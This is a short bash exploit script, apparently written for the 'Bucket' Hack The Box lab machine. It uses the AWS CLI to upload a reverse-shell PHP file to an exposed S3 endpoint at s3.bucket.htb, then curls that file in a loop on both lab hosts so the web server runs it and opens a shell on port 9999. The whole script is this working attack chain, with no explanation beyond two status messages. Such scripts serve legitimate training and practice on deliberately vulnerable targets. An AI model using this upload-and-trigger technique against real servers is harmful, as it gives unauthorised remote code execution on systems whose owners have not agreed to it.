echo "[!] Executing script for reverse shell on port 9999..."
echo "[!] Ctrl+c when connection established"

aws --endpoint-url http://s3.bucket.htb/ s3 cp revshell.php s3://adserver/

while [ true ]
do
	curl http://bucket.htb/revshell.php &> /dev/null;
	curl http://s3.bucket.htb/adserver/revshell.php &> /dev/null;
done
